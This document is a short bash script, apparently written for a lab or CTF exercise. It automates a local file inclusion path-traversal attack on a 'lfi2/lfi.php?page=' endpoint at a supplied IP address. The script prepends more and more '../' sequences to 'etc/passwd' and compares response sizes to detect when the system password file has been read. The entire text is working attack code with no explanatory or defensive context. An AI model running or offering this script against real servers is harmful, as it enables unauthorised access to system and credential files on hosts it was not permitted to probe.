#!/bin/bash

if [[ "$1" = "" ]]
then 
	echo 'Usage: bash $0 "<ip address>"'
	exit
fi 

fp="etc/passwd"
echo "[+] searching for $fp..."

result=$(curl -s "http://$1/lfi2/lfi.php?page=$fp" | wc -c)

for i in {1..100}
do
	fp="../$fp"
	new_result=$(curl -s "http://$1/lfi2/lfi.php?page=$fp" | wc -c)
	if [[ $(($result+6)) -lt $new_result ]]
	then
		echo "[+] file possibly found!"
		echo
		echo  "http://$1/lfi2/lfi.php?page=$fp"
		exit
	else
		result=$new_result
	fi
done
